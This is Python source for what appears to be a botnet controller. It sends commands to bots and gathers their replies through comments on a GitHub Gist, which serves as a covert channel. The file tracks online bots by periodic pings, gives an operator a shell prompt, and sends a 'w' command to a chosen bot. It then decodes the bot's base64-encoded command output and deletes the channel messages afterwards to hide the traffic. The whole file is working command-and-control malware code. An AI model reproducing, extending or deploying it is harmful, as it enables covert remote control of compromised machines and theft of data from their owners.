import base64
import threading
from time import sleep, time
from github.GistComment import GistComment
from channel import Channel


class Controller:
    def __init__(self, token: str, gist: str):
        self.channel = Channel(token, gist)
        self.active = True
        self.response_thread = threading.Thread(
            target=self.receive_responses, daemon=True
        )
        self.ping_thread = threading.Thread(target=self.ping_bots, daemon=True)
        self.last_ping = None

        self.bots = {}
        self.bots_lock = threading.Lock()

        self.response_thread.start()
        self.ping_thread.start()
        self.wait_for_commands()

    def receive_responses(self):
        while self.active:
            for new_response in self.channel.check_messages():
                self.handle_response(new_response)

            sleep(2)

    def handle_response(self, response: GistComment):
        response_footer = response.body[response.body.rfind("[") :]
        response_id = base64.b64decode(
            response_footer.split("(")[1].split(")")[0].encode("utf-8")
        ).decode("utf-8")

        bot_id = response_id.split("-")[1]
        command_id = int(response_id.split("-")[0])

        if Channel.PING_RESPONSE in response.body and self.bots_lock.acquire():

            if not self.bots.get(bot_id):
                self.bots[bot_id] = {}

            self.bots[bot_id]["last_ping"] = command_id
            self.bots_lock.release()

            self.channel.delete_message(response.id)

        elif Channel.W_RESPONSE in response.body and self.bots_lock.acquire():

            bot = self.bots.get(bot_id)

            if bot and bot["commands"] and bot["commands"][command_id]:
                stdout = base64.b64decode(response.body[response.body.find("(") + 1: response.body.find(")")].encode('utf-8')).decode('utf-8')
                print(f"\n{stdout}")
                self.channel.delete_message(command_id)

            self.bots_lock.release()
            self.channel.delete_message(response.id)

    def ping_bots(self):
        while self.active:

            if self.last_ping:
                self.channel.delete_message(self.last_ping)

            self.last_ping = self.channel.send_message(f"{Channel.PING_REQUEST}").id

            sleep(60)

    def wait_for_commands(self):

        while self.active:
            input_str = input("$ ")
            args = input_str.split(" ")

            if args[0].lower() == "exit":
                self.exit()
            elif args[0].lower() == "status":
                self.print_status()
            elif args[0].lower() == "w":
                self.w(args)

    def exit(self):
        self.active = False

        if self.last_ping:
            self.channel.delete_message(self.last_ping)

    def print_status(self):
        if not self.bots_lock.acquire():
            print("Couldn't acquire lock for bots dict.")

        print(
            f"Bots currently online: {len([x for x, y in self.bots.items() if y['last_ping'] == self.last_ping])}"
        )

        self.bots_lock.release()

    def w(self, args: list[str]):

        if len(args) < 2:
            print("Invalid bot ID")
            return
            # TODO: Send W to all bots

        bot_id = args[1]

        if not self.bots_lock.acquire():
            print("Couldn't acquire lock for bots dict.")
            return

        bot = self.bots.get(bot_id)

        bot_id = base64.b64encode(bot_id.encode('utf-8')).decode('utf-8')

        if not bot or bot["last_ping"] != self.last_ping:
            print("Specified bot is offline!")
            print(str(self.bots))
            self.bots_lock.release()
            return

        command = self.channel.send_message(
            f"{Channel.W_REQUEST} "
            f"()[{bot_id}]"
        )

        if not bot.get("commands"):
            bot["commands"] = {}

        bot["commands"][command.id] = time()
        self.bots_lock.release()
